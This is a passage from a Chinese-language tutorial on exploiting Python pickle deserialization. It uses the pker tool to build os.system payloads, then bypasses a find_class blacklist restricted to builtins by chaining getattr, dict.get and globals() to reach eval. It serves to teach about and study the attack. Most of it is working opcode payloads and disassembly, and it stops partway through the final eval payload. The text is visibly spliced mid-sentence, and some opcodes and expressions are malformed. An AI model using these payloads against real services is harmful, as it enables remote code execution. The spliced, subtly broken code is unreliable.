  * 类型字面量构造
  * list和dict成员修改
  * 对象成员变量修改
#### 使用方法与实例
pker最主要的有三个函数`GLOBAL()`​、`INST()`​和`OBJ()`​
    GLOBAL('os', 'system')             =>  cos\nsystem\n
    INST('os', 'system', 'ls')         =>  (S'ls'\nios\nsystem\n
    OBJ(GLOBAL('os', 'system'), 'ls')  =>  (cos\nsystem\nS'ls'\no
return可以返回一个对象
    return           =>  .
    return var       =>  g_\n.
    return 1         =>  I1\n.
当然你也可以和Python的正常语法结合起来，下面是使用示例
    #pker_test.py
    i = 0
    s = 'id'
    lst = [i]
    tpl = (0,)
    dct = {tpl: 0}
    system = GLOBAL('os', 'system')
    system(s)
    return
    #命令行下
    $ python3 pker.py  出于这样的理由，你可能会希望通过定制 Unpickler.find_class() 来控制要解封的对象。 与其名称所提示的不同，
> Unpickler.find_class() 会在执行对任何全局对象（例如一个类或一个函数）的请求时被调用 。
> 因此可以完全禁止全局对象或是将它们限制在一个安全的子集中。
  1. 在opcode中 `c`​ `i`​ `\x93`​ 这三个字节码与全局对象有关 当出现这三个字节码的时候 会调用`find_class`​ 当我们使用这三个字节码时不违反其限制即可
  2. find_class() 只会在解析opcode的时候调用一次 所以 只要绕过opcode执行的过程 find_class() 就不会再调用 只需要过一次 通过之后再产生的函数即使在黑名单中 也不会被拦截
#### 绕过builtins
在一些栗子中 我们常常会见到`module=="builtins" ​`​这一限制
    if module == "builtins" and name in safe_builtins:
                return getattr(builtins, name)
buiitins模块 在我们学习ssti的时候 也会经常见到 他就是 当我们启动python之后 即使没有创建任何的变量或者 函数 还是会有很多函数可以调用
即内置函数 内置函数 都是包含在builtins模块内的
    eg.import pickle
    import io
    import builtins
    class RestrictedUnpickler(pickle.Unpickler):
        blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}
        def find_class(self, module, name):
            # Only allow safe classes from builtins.
            if module == "builtins" and name not in self.blacklist:
                return getattr(builtins, name)
            # Forbid everything else.
            raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                         (module, name))
    def restricted_loads(s):
        """Helper function analogous to pickle.loads()."""
        return RestrictedUnpickler(io.BytesIO(s)).load()
以上的代码 限制了我们所使用的模块只能是builtins 而且 不能使用黑名单中的函数
##### 思路一
我们可以借鉴python沙箱逃逸的思路 来获取我们想要的函数 以上的代码并没有禁用`getattr()`​ 此函数 可以获取对象的属性值 因此 我们可以通过
builtins.getattr(builtins.'eval') 来获取eval函数
接下来 我们得构造一个`builtins`​模块 来传给getattr的第一个参数 我们可以使用 `builtins.global()`​函数
来获取`builtins`​模块包含的内容
    import builtins
    print(builtins.globals())
    #{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': , '__spec__': None, '__annotations__': {}, '__builtins__': , 'builtins': }
从中我们可以看出 在builtins模块中 仍然包含builtins模块 因为上面 返回的是一个字典 所以 我们还需要获取get函数
所以我们最终构造的payload就是`builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.globals(),'builtins'),'eval')(command)`​
    import pickle
    import pickletools
    opcode = b'''cbuiltins
    getattr
    (cbuiltins
    dict
    S'get'
    tR.
    '''
    pickletools.dis(opcode )
    print (pickle.loads(opcode))
然后 获取globals() 字典
    import pickle
    import pickletools
    opcode = b'''cbuiltins
    globals
    )R.
    '''
    pickletools.dis(opcode)
    print (pickle.loads(opcode))
       0: c    GLOBAL     'builtins globals'
       18: )    EMPTY_TUPLE
       19: R    REDUCE
       20: .    STOP
    highest protocol among opcodes = 1
    {'__name__': '__main__', '__doc__': None, '__package__': '', '__loader__': None, '__spec__': None, '__file__': 'c:\\Users\\zyc\\Downloads\\main.py', '__cached__': None, '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': , '__spec__': ModuleSpec(name='builtins', loader=, origin='built-in'), '__build_class__': , '__import__': , 'abs': , 'all': , 'any': , 'ascii': , 'bin': , 'breakpoint': , 'callable': , 'chr': , 'compile': , 'delattr': , 'dir': , 'divmod': , 'eval': , 'exec': , 'format': , 'getattr': , 'globals': , 'hasattr': , 'hash': , 'hex': , 'id': , 'input': , 'isinstance': , 'issubclass': , 'iter': , 'aiter': , 'len': , 'locals': , 'max': , 'min': , 'next': , 'anext': , 'oct': , 'ord': , 'pow': , 'print': , 'repr': , 'round': , 'setattr': , 'sorted': , 'sum': , 'vars': , 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': , 'memoryview': , 'bytearray': , 'bytes': , 'classmethod': , 'complex': , 'dict': , 'enumerate': , 'filter': , 'float': , 'frozenset': , 'property': , 'int': , 'list': , 'map': , 'object': , 'range': , 'reversed': , 'set': , 'slice': , 'staticmethod': , 'str': , 'super': , 'tuple': , 'type': , 'zip': , '__debug__': 
    True, 'BaseException': , 'Exception': , 'TypeError': , 'StopAsyncIteration': , 'StopIteration': , 'GeneratorExit': , 'SystemExit': , 'KeyboardInterrupt': , 'ImportError': , 'ModuleNotFoundError': , 'OSError': , 
    'EnvironmentError': , 'IOError': , 'WindowsError': , 'EOFError': , 'RuntimeError': , 'RecursionError': , 'NotImplementedError': , 'NameError': , 'UnboundLocalError': , 'AttributeError': , 'SyntaxError': , 'IndentationError': 
    , 'TabError': , 'LookupError': , 'IndexError': , 'KeyError': , 'ValueError': , 'UnicodeError': , 'UnicodeEncodeError': , 'UnicodeDecodeError': , 'UnicodeTranslateError': , 'AssertionError': , 'ArithmeticError': , 'FloatingPointError': , 'OverflowError': , 'ZeroDivisionError': , 'SystemError': , 'ReferenceError': , 'MemoryError': , 'BufferError': , 'Warning': , 'UserWarning': , 'EncodingWarning': , 'DeprecationWarning': , 'PendingDeprecationWarning': , 'SyntaxWarning': , 'RuntimeWarning': , 'FutureWarning': , 'ImportWarning': , 'UnicodeWarning': , 'BytesWarning': , 'ResourceWarning': , 'ConnectionError': , 'BlockingIOError': , 'BrokenPipeError': , 'ChildProcessError': , 'ConnectionAbortedError': , 'ConnectionRefusedError': , 'ConnectionResetError': , 'FileExistsError': , 'FileNotFoundError': , 'IsADirectoryError': , 'NotADirectoryError': , 'InterruptedError': , 'PermissionError': , 'ProcessLookupError': , 'TimeoutError': , 'open': ,....
我们现在有了字典 又有了get函数 我们就可以从builtins模块中任意获取了
    import pickle
    import pickletools
    opcode = b'''cbuiltins
    getattr
    (builtins
    dict
    S'get'
    tR(cbuiltins
    globals
    )RS'__builtins__'
    tR.'''
    pickletools.dis(opcode)
    print(pickle.loads(opcode))
    '''
        0: c    GLOBAL     'builtins getattr'
       18: (    MARK
       19: c        GLOBAL     'builtins dict'
       34: S        STRING     'get'
       41: t        TUPLE      (MARK at 18)
       42: R    REDUCE
       43: (    MARK
       44: c        GLOBAL     'builtins globals'
       62: )        EMPTY_TUPLE
       63: R        REDUCE
       64: S        STRING     '__builtins__'
       80: t        TUPLE      (MARK at 43)
       81: R    REDUCE
       82: .    STOP
    highest protocol among opcodes = 1
    '''
调用builtins中的eval函数
    import pickle
    opcode4=b'''cbuiltins
    getattr
    (cbuiltins
    getattr
    (cbuiltins
    dict
    S'get'
    tR(cbuiltins
    globals
    )RS'__builtins__'